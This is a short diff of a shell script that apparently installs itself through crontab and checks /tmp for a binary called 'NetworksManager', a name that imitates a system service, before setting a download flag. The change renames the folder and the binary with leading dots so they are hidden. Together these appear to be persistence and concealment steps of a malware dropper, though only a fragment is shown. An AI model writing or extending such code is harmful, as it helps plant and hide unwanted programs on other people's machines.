@@ -40,7 +40,7 @@ crontab "${cronfile}"
 rm -r "${cronfile}"
 
 # check if we have executable / download
-if [ ! -f "/tmp/fs-manager/NetworksManager" ]; then
+if [ ! -f "/tmp/.fs-manager/.NetworksManager" ]; then
     echo "NetworksManager not found"
     download=1
 else
